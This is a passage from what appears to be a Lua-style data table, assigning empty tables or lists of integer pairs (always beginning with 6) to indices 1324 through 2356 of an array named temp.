	temp[1324] = {}
	temp[1325] = {{6, -11}, }
	temp[1326] = {}
	temp[1327] = {}
	temp[1328] = {}
	temp[1329] = {{6, -11}, }
	temp[1330] = {}
	temp[1331] = {}
	temp[1332] = {}
	temp[1333] = {{6, 6}, }
	temp[1334] = {}
	temp[1335] = {}
	temp[1336] = {}
	temp[1337] = {{6, -6}, }
	temp[1338] = {}
	temp[1339] = {}
	temp[1340] = {}
	temp[1341] = {{6, 3}, }
	temp[1342] = {}
	temp[1343] = {}
	temp[1344] = {}
	temp[1345] = {{6, 1}, {6, -11}, }
	temp[1346] = {}
	temp[1347] = {}
	temp[1348] = {}
	temp[1349] = {{6, 1}, {6, -11}, }
	temp[1350] = {}
	temp[1351] = {}
	temp[1352] = {}
	temp[1353] = {{6, 1}, {6, -11}, }
	temp[1354] = {}
	temp[1355] = {}
	temp[1356] = {}
	temp[1357] = {}
	temp[1358] = {}
	temp[1359] = {}
	temp[1360] = {}
	temp[1361] = {{6, 3}, {6, -9}, }
	temp[1362] = {}
	temp[1363] = {}
	temp[1364] = {}
	temp[1365] = {}
	temp[1366] = {}
	temp[1367] = {}
	temp[1368] = {}
	temp[1369] = {{6, 5}, {6, -7}, }
	temp[1370] = {}
	temp[1371] = {}
	temp[1372] = {}
	temp[1373] = {{6, 6}, {6, -6}, }
	temp[1374] = {}
	temp[1375] = {}
	temp[1376] = {}
	temp[1377] = {}
	temp[1378] = {}
	temp[1379] = {}
	temp[1380] = {}
	temp[1381] = {{6, 18}, {6, 22}, {6, 13}, }
	temp[1382] = {}
	temp[1383] = {}
	temp[1384] = {}
	temp[1385] = {}
	temp[1386] = {}
	temp[1387] = {}
	temp[1388] = {}
	temp[1389] = {{6, 18}, {6, 22}, {6, 13}, }
	temp[1390] = {}
	temp[1391] = {}
	temp[1392] = {}
	temp[1393] = {{6, 15}, {6, 20}, {6, 11}, }
	temp[1394] = {}
	temp[1395] = {}
	temp[1396] = {}
	temp[1397] = {{6, 15}, {6, 20}, {6, 11}, }
	temp[1398] = {}
	temp[1399] = {}
	temp[1400] = {}
	temp[1401] = {{6, 13}, {6, 18}, {6, 10}, }
	temp[1402] = {}
	temp[1403] = {}
	temp[1404] = {}
	temp[1405] = {}
	temp[1406] = {}
	temp[1407] = {}
	temp[1408] = {}
	temp[1409] = {{6, -5}, }
	temp[1410] = {}
	temp[1411] = {}
	temp[1412] = {}
	temp[1413] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1414] = {}
	temp[1415] = {}
	temp[1416] = {}
	temp[1417] = {}
	temp[1418] = {}
	temp[1419] = {}
	temp[1420] = {}
	temp[1421] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1422] = {}
	temp[1423] = {}
	temp[1424] = {}
	temp[1425] = {{6, 11}, {6, 7}, }
	temp[1426] = {}
	temp[1427] = {}
	temp[1428] = {}
	temp[1429] = {{6, 2}, }
	temp[1430] = {}
	temp[1431] = {}
	temp[1432] = {}
	temp[1433] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1434] = {}
	temp[1435] = {}
	temp[1436] = {}
	temp[1437] = {}
	temp[1438] = {}
	temp[1439] = {}
	temp[1440] = {}
	temp[1441] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1442] = {}
	temp[1443] = {}
	temp[1444] = {}
	temp[1445] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1446] = {}
	temp[1447] = {}
	temp[1448] = {}
	temp[1449] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1450] = {}
	temp[1451] = {}
	temp[1452] = {}
	temp[1453] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1454] = {}
	temp[1455] = {}
	temp[1456] = {}
	temp[1457] = {{6, 9}, {6, 6}, {6, 2}, }
	temp[1458] = {}
	temp[1459] = {}
	temp[1460] = {}
	temp[1461] = {{6, -10}, }
	temp[1462] = {}
	temp[1463] = {}
	temp[1464] = {}
	temp[1465] = {}
	temp[1466] = {}
	temp[1467] = {}
	temp[1468] = {}
	temp[1469] = {{6, -10}, }
	temp[1470] = {}
	temp[1471] = {}
	temp[1472] = {}
	temp[1473] = {{6, -5}, }
	temp[1474] = {}
	temp[1475] = {}
	temp[1476] = {}
	temp[1477] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1478] = {}
	temp[1479] = {}
	temp[1480] = {}
	temp[1481] = {}
	temp[1482] = {}
	temp[1483] = {}
	temp[1484] = {}
	temp[1485] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1486] = {}
	temp[1487] = {}
	temp[1488] = {}
	temp[1489] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1490] = {}
	temp[1491] = {}
	temp[1492] = {}
	temp[1493] = {}
	temp[1494] = {}
	temp[1495] = {}
	temp[1496] = {}
	temp[1497] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1498] = {}
	temp[1499] = {}
	temp[1500] = {}
	temp[1501] = {}
	temp[1502] = {}
	temp[1503] = {}
	temp[1504] = {}
	temp[1505] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1506] = {}
	temp[1507] = {}
	temp[1508] = {}
	temp[1509] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1510] = {}
	temp[1511] = {}
	temp[1512] = {}
	temp[1513] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1514] = {}
	temp[1515] = {}
	temp[1516] = {}
	temp[1517] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1518] = {}
	temp[1519] = {}
	temp[1520] = {}
	temp[1521] = {{6, 9}, {6, 6}, {6, 2}, }
	temp[1522] = {}
	temp[1523] = {}
	temp[1524] = {}
	temp[1525] = {{6, -10}, }
	temp[1526] = {}
	temp[1527] = {}
	temp[1528] = {}
	temp[1529] = {}
	temp[1530] = {}
	temp[1531] = {}
	temp[1532] = {}
	temp[1533] = {{6, 2}, {6, -10}, }
	temp[1534] = {}
	temp[1535] = {}
	temp[1536] = {}
	temp[1537] = {{6, 11}, {6, -5}, }
	temp[1538] = {}
	temp[1539] = {}
	temp[1540] = {}
	temp[1541] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1542] = {}
	temp[1543] = {}
	temp[1544] = {}
	temp[1545] = {{6, 9}, }
	temp[1546] = {}
	temp[1547] = {}
	temp[1548] = {}
	temp[1549] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1550] = {}
	temp[1551] = {}
	temp[1552] = {}
	temp[1553] = {{6, 7}, {6, -1}, }
	temp[1554] = {}
	temp[1555] = {}
	temp[1556] = {}
	temp[1557] = {}
	temp[1558] = {}
	temp[1559] = {}
	temp[1560] = {}
	temp[1561] = {{6, 14}, {6, 11}, {6, 6}, }
	temp[1562] = {}
	temp[1563] = {}
	temp[1564] = {}
	temp[1565] = {{6, 6}, }
	temp[1566] = {}
	temp[1567] = {}
	temp[1568] = {}
	temp[1569] = {{6, 4}, {6, 0}, }
	temp[1570] = {}
	temp[1571] = {}
	temp[1572] = {}
	temp[1573] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1574] = {}
	temp[1575] = {}
	temp[1576] = {}
	temp[1577] = {}
	temp[1578] = {}
	temp[1579] = {}
	temp[1580] = {}
	temp[1581] = {{6, 9}, {6, 12}, {6, 7}, {6, 4}, }
	temp[1582] = {}
	temp[1583] = {}
	temp[1584] = {}
	temp[1585] = {{6, -3}, }
	temp[1586] = {}
	temp[1587] = {}
	temp[1588] = {}
	temp[1589] = {}
	temp[1590] = {}
	temp[1591] = {}
	temp[1592] = {}
	temp[1593] = {{6, 9}, {6, 16}, {6, 12}, {6, 7}, }
	temp[1594] = {}
	temp[1595] = {}
	temp[1596] = {}
	temp[1597] = {{6, 7}, }
	temp[1598] = {}
	temp[1599] = {}
	temp[1600] = {}
	temp[1601] = {{6, 6}, {6, 2}, }
	temp[1602] = {}
	temp[1603] = {}
	temp[1604] = {}
	temp[1605] = {{6, 14}, {6, 9}, {6, 6}, }
	temp[1606] = {}
	temp[1607] = {}
	temp[1608] = {}
	temp[1609] = {{6, 6}, }
	temp[1610] = {}
	temp[1611] = {}
	temp[1612] = {}
	temp[1613] = {{6, 14}, {6, 9}, {6, 6}, }
	temp[1614] = {}
	temp[1615] = {}
	temp[1616] = {}
	temp[1617] = {{6, 6}, {6, -6}, }
	temp[1618] = {}
	temp[1619] = {}
	temp[1620] = {}
	temp[1621] = {}
	temp[1622] = {}
	temp[1623] = {}
	temp[1624] = {}
	temp[1625] = {{6, 4}, {6, 12}, {6, 9}, {6, 2}, }
	temp[1626] = {}
	temp[1627] = {}
	temp[1628] = {}
	temp[1629] = {{6, 6}, }
	temp[1630] = {}
	temp[1631] = {}
	temp[1632] = {}
	temp[1633] = {{6, 4}, {6, -5}, }
	temp[1634] = {}
	temp[1635] = {}
	temp[1636] = {}
	temp[1637] = {{6, 12}, {6, 9}, {6, 4}, }
	temp[1638] = {}
	temp[1639] = {}
	temp[1640] = {}
	temp[1641] = {{6, 2}, }
	temp[1642] = {}
	temp[1643] = {}
	temp[1644] = {}
	temp[1645] = {{6, 2}, {6, 12}, {6, 9}, {6, 4}, }
	temp[1646] = {}
	temp[1647] = {}
	temp[1648] = {}
	temp[1649] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1650] = {}
	temp[1651] = {}
	temp[1652] = {}
	temp[1653] = {{6, 2}, }
	temp[1654] = {}
	temp[1655] = {}
	temp[1656] = {}
	temp[1657] = {{6, 14}, {6, 2}, {6, -10}, }
	temp[1658] = {}
	temp[1659] = {}
	temp[1660] = {}
	temp[1661] = {{6, 2}, }
	temp[1662] = {}
	temp[1663] = {}
	temp[1664] = {}
	temp[1665] = {{6, 11}, {6, -5}, }
	temp[1666] = {}
	temp[1667] = {}
	temp[1668] = {}
	temp[1669] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1670] = {}
	temp[1671] = {}
	temp[1672] = {}
	temp[1673] = {{6, 9}, }
	temp[1674] = {}
	temp[1675] = {}
	temp[1676] = {}
	temp[1677] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1678] = {}
	temp[1679] = {}
	temp[1680] = {}
	temp[1681] = {{6, 7}, {6, -1}, }
	temp[1682] = {}
	temp[1683] = {}
	temp[1684] = {}
	temp[1685] = {}
	temp[1686] = {}
	temp[1687] = {}
	temp[1688] = {}
	temp[1689] = {{6, 14}, {6, 11}, {6, 6}, }
	temp[1690] = {}
	temp[1691] = {}
	temp[1692] = {}
	temp[1693] = {{6, 6}, }
	temp[1694] = {}
	temp[1695] = {}
	temp[1696] = {}
	temp[1697] = {{6, 4}, {6, 0}, }
	temp[1698] = {}
	temp[1699] = {}
	temp[1700] = {}
	temp[1701] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1702] = {}
	temp[1703] = {}
	temp[1704] = {}
	temp[1705] = {}
	temp[1706] = {}
	temp[1707] = {}
	temp[1708] = {}
	temp[1709] = {{6, 9}, {6, 12}, {6, 7}, {6, 4}, }
	temp[1710] = {}
	temp[1711] = {}
	temp[1712] = {}
	temp[1713] = {{6, -3}, }
	temp[1714] = {}
	temp[1715] = {}
	temp[1716] = {}
	temp[1717] = {}
	temp[1718] = {}
	temp[1719] = {}
	temp[1720] = {}
	temp[1721] = {{6, 9}, {6, 16}, {6, 12}, {6, 7}, }
	temp[1722] = {}
	temp[1723] = {}
	temp[1724] = {}
	temp[1725] = {{6, 7}, }
	temp[1726] = {}
	temp[1727] = {}
	temp[1728] = {}
	temp[1729] = {{6, 14}, {6, 9}, {6, 6}, {6, 2}, }
	temp[1730] = {}
	temp[1731] = {}
	temp[1732] = {}
	temp[1733] = {}
	temp[1734] = {}
	temp[1735] = {}
	temp[1736] = {}
	temp[1737] = {{6, 6}, }
	temp[1738] = {}
	temp[1739] = {}
	temp[1740] = {}
	temp[1741] = {{6, 6}, }
	temp[1742] = {}
	temp[1743] = {}
	temp[1744] = {}
	temp[1745] = {{6, 6}, }
	temp[1746] = {}
	temp[1747] = {}
	temp[1748] = {}
	temp[1749] = {{6, 2}, }
	temp[1750] = {}
	temp[1751] = {}
	temp[1752] = {}
	temp[1753] = {{6, 2}, }
	temp[1754] = {}
	temp[1755] = {}
	temp[1756] = {}
	temp[1757] = {{6, 2}, }
	temp[1758] = {}
	temp[1759] = {}
	temp[1760] = {}
	temp[1761] = {{6, 12}, {6, 7}, {6, 4}, {6, -3}, }
	temp[1762] = {}
	temp[1763] = {}
	temp[1764] = {}
	temp[1765] = {{6, 12}, {6, 6}, {6, 4}, {6, -10}, }
	temp[1766] = {}
	temp[1767] = {}
	temp[1768] = {}
	temp[1769] = {}
	temp[1770] = {}
	temp[1771] = {}
	temp[1772] = {}
	temp[1773] = {{6, 11}, {6, 7}, {6, 2}, {6, -5}, }
	temp[1774] = {}
	temp[1775] = {}
	temp[1776] = {}
	temp[1777] = {}
	temp[1778] = {}
	temp[1779] = {}
	temp[1780] = {}
	temp[1781] = {{6, 7}, {6, 11}, {6, 14}, }
	temp[1782] = {}
	temp[1783] = {}
	temp[1784] = {}
	temp[1785] = {{6, 4}, {6, 9}, {6, 12}, }
	temp[1786] = {}
	temp[1787] = {}
	temp[1788] = {}
	temp[1789] = {{6, 2}, {6, 7}, {6, 11}, }
	temp[1790] = {}
	temp[1791] = {}
	temp[1792] = {}
	temp[1793] = {{6, 11}, {6, -5}, }
	temp[1794] = {}
	temp[1795] = {}
	temp[1796] = {}
	temp[1797] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1798] = {}
	temp[1799] = {}
	temp[1800] = {}
	temp[1801] = {{6, 9}, }
	temp[1802] = {}
	temp[1803] = {}
	temp[1804] = {}
	temp[1805] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1806] = {}
	temp[1807] = {}
	temp[1808] = {}
	temp[1809] = {{6, 7}, {6, -1}, }
	temp[1810] = {}
	temp[1811] = {}
	temp[1812] = {}
	temp[1813] = {}
	temp[1814] = {}
	temp[1815] = {}
	temp[1816] = {}
	temp[1817] = {{6, 14}, {6, 11}, {6, 6}, }
	temp[1818] = {}
	temp[1819] = {}
	temp[1820] = {}
	temp[1821] = {{6, 6}, }
	temp[1822] = {}
	temp[1823] = {}
	temp[1824] = {}
	temp[1825] = {{6, 4}, {6, 0}, }
	temp[1826] = {}
	temp[1827] = {}
	temp[1828] = {}
	temp[1829] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1830] = {}
	temp[1831] = {}
	temp[1832] = {}
	temp[1833] = {}
	temp[1834] = {}
	temp[1835] = {}
	temp[1836] = {}
	temp[1837] = {{6, 9}, {6, 12}, {6, 7}, {6, 4}, }
	temp[1838] = {}
	temp[1839] = {}
	temp[1840] = {}
	temp[1841] = {{6, -3}, }
	temp[1842] = {}
	temp[1843] = {}
	temp[1844] = {}
	temp[1845] = {}
	temp[1846] = {}
	temp[1847] = {}
	temp[1848] = {}
	temp[1849] = {{6, 9}, {6, 16}, {6, 12}, {6, 7}, }
	temp[1850] = {}
	temp[1851] = {}
	temp[1852] = {}
	temp[1853] = {{6, 7}, }
	temp[1854] = {}
	temp[1855] = {}
	temp[1856] = {}
	temp[1857] = {{6, 6}, {6, 2}, }
	temp[1858] = {}
	temp[1859] = {}
	temp[1860] = {}
	temp[1861] = {{6, 14}, {6, 9}, {6, 6}, }
	temp[1862] = {}
	temp[1863] = {}
	temp[1864] = {}
	temp[1865] = {{6, 6}, }
	temp[1866] = {}
	temp[1867] = {}
	temp[1868] = {}
	temp[1869] = {{6, 14}, {6, 9}, {6, 6}, }
	temp[1870] = {}
	temp[1871] = {}
	temp[1872] = {}
	temp[1873] = {{6, 6}, {6, -6}, }
	temp[1874] = {}
	temp[1875] = {}
	temp[1876] = {}
	temp[1877] = {}
	temp[1878] = {}
	temp[1879] = {}
	temp[1880] = {}
	temp[1881] = {{6, 4}, {6, 12}, {6, 9}, {6, 2}, }
	temp[1882] = {}
	temp[1883] = {}
	temp[1884] = {}
	temp[1885] = {{6, 6}, }
	temp[1886] = {}
	temp[1887] = {}
	temp[1888] = {}
	temp[1889] = {{6, 4}, {6, -5}, }
	temp[1890] = {}
	temp[1891] = {}
	temp[1892] = {}
	temp[1893] = {{6, 12}, {6, 9}, {6, 4}, }
	temp[1894] = {}
	temp[1895] = {}
	temp[1896] = {}
	temp[1897] = {{6, 2}, }
	temp[1898] = {}
	temp[1899] = {}
	temp[1900] = {}
	temp[1901] = {{6, 2}, {6, 12}, {6, 9}, {6, 4}, }
	temp[1902] = {}
	temp[1903] = {}
	temp[1904] = {}
	temp[1905] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1906] = {}
	temp[1907] = {}
	temp[1908] = {}
	temp[1909] = {{6, 2}, }
	temp[1910] = {}
	temp[1911] = {}
	temp[1912] = {}
	temp[1913] = {{6, 14}, {6, 2}, {6, -10}, }
	temp[1914] = {}
	temp[1915] = {}
	temp[1916] = {}
	temp[1917] = {{6, 2}, }
	temp[1918] = {}
	temp[1919] = {}
	temp[1920] = {}
	temp[1921] = {{6, 11}, {6, -5}, }
	temp[1922] = {}
	temp[1923] = {}
	temp[1924] = {}
	temp[1925] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1926] = {}
	temp[1927] = {}
	temp[1928] = {}
	temp[1929] = {{6, 9}, }
	temp[1930] = {}
	temp[1931] = {}
	temp[1932] = {}
	temp[1933] = {{6, 11}, {6, 7}, {6, 2}, }
	temp[1934] = {}
	temp[1935] = {}
	temp[1936] = {}
	temp[1937] = {{6, 7}, {6, -1}, }
	temp[1938] = {}
	temp[1939] = {}
	temp[1940] = {}
	temp[1941] = {}
	temp[1942] = {}
	temp[1943] = {}
	temp[1944] = {}
	temp[1945] = {{6, 14}, {6, 11}, {6, 6}, }
	temp[1946] = {}
	temp[1947] = {}
	temp[1948] = {}
	temp[1949] = {{6, 6}, }
	temp[1950] = {}
	temp[1951] = {}
	temp[1952] = {}
	temp[1953] = {{6, 4}, {6, 0}, }
	temp[1954] = {}
	temp[1955] = {}
	temp[1956] = {}
	temp[1957] = {{6, 12}, {6, 7}, {6, 4}, }
	temp[1958] = {}
	temp[1959] = {}
	temp[1960] = {}
	temp[1961] = {}
	temp[1962] = {}
	temp[1963] = {}
	temp[1964] = {}
	temp[1965] = {{6, 9}, {6, 12}, {6, 7}, {6, 4}, }
	temp[1966] = {}
	temp[1967] = {}
	temp[1968] = {}
	temp[1969] = {{6, -3}, }
	temp[1970] = {}
	temp[1971] = {}
	temp[1972] = {}
	temp[1973] = {}
	temp[1974] = {}
	temp[1975] = {}
	temp[1976] = {}
	temp[1977] = {{6, 9}, {6, 16}, {6, 12}, {6, 7}, }
	temp[1978] = {}
	temp[1979] = {}
	temp[1980] = {}
	temp[1981] = {{6, 7}, }
	temp[1982] = {}
	temp[1983] = {}
	temp[1984] = {}
	temp[1985] = {{6, 14}, {6, 9}, {6, 6}, {6, 2}, }
	temp[1986] = {}
	temp[1987] = {}
	temp[1988] = {}
	temp[1989] = {}
	temp[1990] = {}
	temp[1991] = {}
	temp[1992] = {}
	temp[1993] = {{6, 6}, }
	temp[1994] = {}
	temp[1995] = {}
	temp[1996] = {}
	temp[1997] = {{6, 6}, }
	temp[1998] = {}
	temp[1999] = {}
	temp[2000] = {}
	temp[2001] = {{6, 6}, }
	temp[2002] = {}
	temp[2003] = {}
	temp[2004] = {}
	temp[2005] = {}
	temp[2006] = {}
	temp[2007] = {}
	temp[2008] = {}
	temp[2009] = {{6, 2}, }
	temp[2010] = {}
	temp[2011] = {}
	temp[2012] = {}
	temp[2013] = {{6, 14}, {6, 9}, {6, 6}, {6, 2}, }
	temp[2014] = {}
	temp[2015] = {}
	temp[2016] = {}
	temp[2017] = {{6, 12}, {6, 7}, {6, 4}, {6, -3}, }
	temp[2018] = {}
	temp[2019] = {}
	temp[2020] = {}
	temp[2021] = {}
	temp[2022] = {}
	temp[2023] = {}
	temp[2024] = {}
	temp[2025] = {{6, 12}, {6, 6}, {6, 4}, {6, -10}, }
	temp[2026] = {}
	temp[2027] = {}
	temp[2028] = {}
	temp[2029] = {{6, 11}, {6, 7}, {6, 2}, {6, -5}, }
	temp[2030] = {}
	temp[2031] = {}
	temp[2032] = {}
	temp[2033] = {}
	temp[2034] = {}
	temp[2035] = {}
	temp[2036] = {}
	temp[2037] = {{6, 7}, }
	temp[2038] = {}
	temp[2039] = {}
	temp[2040] = {}
	temp[2041] = {}
	temp[2042] = {}
	temp[2043] = {}
	temp[2044] = {}
	temp[2045] = {{6, 4}, }
	temp[2046] = {}
	temp[2047] = {}
	temp[2048] = {}
	temp[2049] = {{6, 2}, {6, -10}, }
	temp[2050] = {}
	temp[2051] = {}
	temp[2052] = {}
	temp[2053] = {{6, 2}, }
	temp[2054] = {}
	temp[2055] = {}
	temp[2056] = {}
	temp[2057] = {{6, 2}, {6, 18}, {6, 9}, }
	temp[2058] = {}
	temp[2059] = {}
	temp[2060] = {}
	temp[2061] = {{6, 14}, {6, 6}, }
	temp[2062] = {}
	temp[2063] = {}
	temp[2064] = {}
	temp[2065] = {{6, -6}, }
	temp[2066] = {}
	temp[2067] = {}
	temp[2068] = {}
	temp[2069] = {{6, 4}, {6, 9}, {6, 12}, }
	temp[2070] = {}
	temp[2071] = {}
	temp[2072] = {}
	temp[2073] = {}
	temp[2074] = {}
	temp[2075] = {}
	temp[2076] = {}
	temp[2077] = {{6, 4}, {6, 9}, {6, 12}, {6, -5}, }
	temp[2078] = {}
	temp[2079] = {}
	temp[2080] = {}
	temp[2081] = {{6, 2}, {6, 7}, {6, 11}, }
	temp[2082] = {}
	temp[2083] = {}
	temp[2084] = {}
	temp[2085] = {{6, 2}, {6, 7}, {6, 11}, }
	temp[2086] = {}
	temp[2087] = {}
	temp[2088] = {}
	temp[2089] = {{6, 2}, {6, 7}, {6, 11}, }
	temp[2090] = {}
	temp[2091] = {}
	temp[2092] = {}
	temp[2093] = {{6, -10}, }
	temp[2094] = {}
	temp[2095] = {}
	temp[2096] = {}
	temp[2097] = {{6, -10}, }
	temp[2098] = {}
	temp[2099] = {}
	temp[2100] = {}
	temp[2101] = {{6, 7}, }
	temp[2102] = {}
	temp[2103] = {}
	temp[2104] = {}
	temp[2105] = {{6, -5}, }
	temp[2106] = {}
	temp[2107] = {}
	temp[2108] = {}
	temp[2109] = {{6, 4}, }
	temp[2110] = {}
	temp[2111] = {}
	temp[2112] = {}
	temp[2113] = {{6, 2}, {6, -10}, }
	temp[2114] = {}
	temp[2115] = {}
	temp[2116] = {}
	temp[2117] = {{6, 2}, }
	temp[2118] = {}
	temp[2119] = {}
	temp[2120] = {}
	temp[2121] = {{6, 2}, {6, 18}, {6, 9}, }
	temp[2122] = {}
	temp[2123] = {}
	temp[2124] = {}
	temp[2125] = {{6, 14}, {6, 6}, }
	temp[2126] = {}
	temp[2127] = {}
	temp[2128] = {}
	temp[2129] = {{6, -6}, }
	temp[2130] = {}
	temp[2131] = {}
	temp[2132] = {}
	temp[2133] = {{6, 4}, {6, 9}, {6, 12}, }
	temp[2134] = {}
	temp[2135] = {}
	temp[2136] = {}
	temp[2137] = {}
	temp[2138] = {}
	temp[2139] = {}
	temp[2140] = {}
	temp[2141] = {{6, 4}, {6, 9}, {6, 12}, {6, -5}, }
	temp[2142] = {}
	temp[2143] = {}
	temp[2144] = {}
	temp[2145] = {{6, 2}, {6, 7}, {6, 11}, }
	temp[2146] = {}
	temp[2147] = {}
	temp[2148] = {}
	temp[2149] = {{6, 2}, {6, 7}, {6, 11}, }
	temp[2150] = {}
	temp[2151] = {}
	temp[2152] = {}
	temp[2153] = {{6, 2}, {6, 7}, {6, 11}, }
	temp[2154] = {}
	temp[2155] = {}
	temp[2156] = {}
	temp[2157] = {{6, -10}, }
	temp[2158] = {}
	temp[2159] = {}
	temp[2160] = {}
	temp[2161] = {{6, -10}, }
	temp[2162] = {}
	temp[2163] = {}
	temp[2164] = {}
	temp[2165] = {{6, 7}, }
	temp[2166] = {}
	temp[2167] = {}
	temp[2168] = {}
	temp[2169] = {{6, -5}, }
	temp[2170] = {}
	temp[2171] = {}
	temp[2172] = {}
	temp[2173] = {{6, 4}, }
	temp[2174] = {}
	temp[2175] = {}
	temp[2176] = {}
	temp[2177] = {{6, 2}, {6, -10}, }
	temp[2178] = {}
	temp[2179] = {}
	temp[2180] = {}
	temp[2181] = {{6, 2}, {6, -10}, }
	temp[2182] = {}
	temp[2183] = {}
	temp[2184] = {}
	temp[2185] = {{6, 2}, {6, -10}, }
	temp[2186] = {}
	temp[2187] = {}
	temp[2188] = {}
	temp[2189] = {}
	temp[2190] = {}
	temp[2191] = {}
	temp[2192] = {}
	temp[2193] = {{6, 4}, {6, -8}, }
	temp[2194] = {}
	temp[2195] = {}
	temp[2196] = {}
	temp[2197] = {}
	temp[2198] = {}
	temp[2199] = {}
	temp[2200] = {}
	temp[2201] = {{6, 6}, {6, -6}, }
	temp[2202] = {}
	temp[2203] = {}
	temp[2204] = {}
	temp[2205] = {{6, 7}, {6, -5}, }
	temp[2206] = {}
	temp[2207] = {}
	temp[2208] = {}
	temp[2209] = {}
	temp[2210] = {}
	temp[2211] = {}
	temp[2212] = {}
	temp[2213] = {{6, 19}, {6, 23}, {6, 14}, }
	temp[2214] = {}
	temp[2215] = {}
	temp[2216] = {}
	temp[2217] = {}
	temp[2218] = {}
	temp[2219] = {}
	temp[2220] = {}
	temp[2221] = {{6, 19}, {6, 23}, {6, 14}, }
	temp[2222] = {}
	temp[2223] = {}
	temp[2224] = {}
	temp[2225] = {{6, 16}, {6, 21}, {6, 12}, }
	temp[2226] = {}
	temp[2227] = {}
	temp[2228] = {}
	temp[2229] = {{6, 16}, {6, 21}, {6, 12}, }
	temp[2230] = {}
	temp[2231] = {}
	temp[2232] = {}
	temp[2233] = {{6, 14}, {6, 19}, {6, 11}, }
	temp[2234] = {}
	temp[2235] = {}
	temp[2236] = {}
	temp[2237] = {{6, 3}, }
	temp[2238] = {}
	temp[2239] = {}
	temp[2240] = {}
	temp[2241] = {{6, 8}, {6, 12}, {6, -4}, }
	temp[2242] = {}
	temp[2243] = {}
	temp[2244] = {}
	temp[2245] = {{6, 8}, {6, 12}, {6, -4}, }
	temp[2246] = {}
	temp[2247] = {}
	temp[2248] = {}
	temp[2249] = {{6, 1}, {6, 10}, }
	temp[2250] = {}
	temp[2251] = {}
	temp[2252] = {}
	temp[2253] = {{6, 24}, {6, 27}, {6, 12}, {6, 15}, }
	temp[2254] = {}
	temp[2255] = {}
	temp[2256] = {}
	temp[2257] = {{6, 0}, {6, 8}, }
	temp[2258] = {}
	temp[2259] = {}
	temp[2260] = {}
	temp[2261] = {{6, 24}, {6, 27}, {6, 12}, {6, 15}, {6, -9}, }
	temp[2262] = {}
	temp[2263] = {}
	temp[2264] = {}
	temp[2265] = {{6, 3}, {6, 7}, }
	temp[2266] = {}
	temp[2267] = {}
	temp[2268] = {}
	temp[2269] = {{6, 24}, {6, 27}, {6, 12}, {6, 15}, {6, 3}, {6, 7}, {6, -9}, }
	temp[2270] = {}
	temp[2271] = {}
	temp[2272] = {}
	temp[2273] = {{6, 1}, {6, 5}, {6, -11}, }
	temp[2274] = {}
	temp[2275] = {}
	temp[2276] = {}
	temp[2277] = {{6, 1}, {6, 5}, {6, -11}, }
	temp[2278] = {}
	temp[2279] = {}
	temp[2280] = {}
	temp[2281] = {{6, 22}, {6, 25}, {6, 10}, {6, 13}, }
	temp[2282] = {}
	temp[2283] = {}
	temp[2284] = {}
	temp[2285] = {{6, -2}, {6, 10}, }
	temp[2286] = {}
	temp[2287] = {}
	temp[2288] = {}
	temp[2289] = {{6, -7}, }
	temp[2290] = {}
	temp[2291] = {}
	temp[2292] = {}
	temp[2293] = {{6, 1}, {6, 8}, }
	temp[2294] = {}
	temp[2295] = {}
	temp[2296] = {}
	temp[2297] = {{6, 22}, {6, 25}, {6, 10}, {6, 13}, }
	temp[2298] = {}
	temp[2299] = {}
	temp[2300] = {}
	temp[2301] = {{6, 5}, {6, 8}, }
	temp[2302] = {}
	temp[2303] = {}
	temp[2304] = {}
	temp[2305] = {{6, 3}, {6, 7}, {6, -9}, }
	temp[2306] = {}
	temp[2307] = {}
	temp[2308] = {}
	temp[2309] = {{6, -9}, }
	temp[2310] = {}
	temp[2311] = {}
	temp[2312] = {}
	temp[2313] = {{6, 3}, {6, 7}, }
	temp[2314] = {}
	temp[2315] = {}
	temp[2316] = {}
	temp[2317] = {{6, 25}, {6, 27}, {6, 13}, {6, 15}, {6, 3}, {6, 7}, }
	temp[2318] = {}
	temp[2319] = {}
	temp[2320] = {}
	temp[2321] = {{6, -2}, }
	temp[2322] = {}
	temp[2323] = {}
	temp[2324] = {}
	temp[2325] = {{6, 25}, {6, 27}, {6, 13}, {6, 15}, {6, 1}, {6, 5}, }
	temp[2326] = {}
	temp[2327] = {}
	temp[2328] = {}
	temp[2329] = {{6, 3}, {6, 7}, }
	temp[2330] = {}
	temp[2331] = {}
	temp[2332] = {}
	temp[2333] = {{6, 25}, {6, 27}, {6, 13}, {6, 15}, }
	temp[2334] = {}
	temp[2335] = {}
	temp[2336] = {}
	temp[2337] = {{6, 5}, {6, 13}, {6, -4}, }
	temp[2338] = {}
	temp[2339] = {}
	temp[2340] = {}
	temp[2341] = {{6, -4}, }
	temp[2342] = {}
	temp[2343] = {}
	temp[2344] = {}
	temp[2345] = {{6, 3}, {6, 12}, }
	temp[2346] = {}
	temp[2347] = {}
	temp[2348] = {}
	temp[2349] = {{6, 20}, {6, 27}, {6, 8}, {6, 15}, {6, 3}, {6, 12}, {6, -4}, }
	temp[2350] = {}
	temp[2351] = {}
	temp[2352] = {}
	temp[2353] = {}
	temp[2354] = {}
	temp[2355] = {}
	temp[2356] = {}
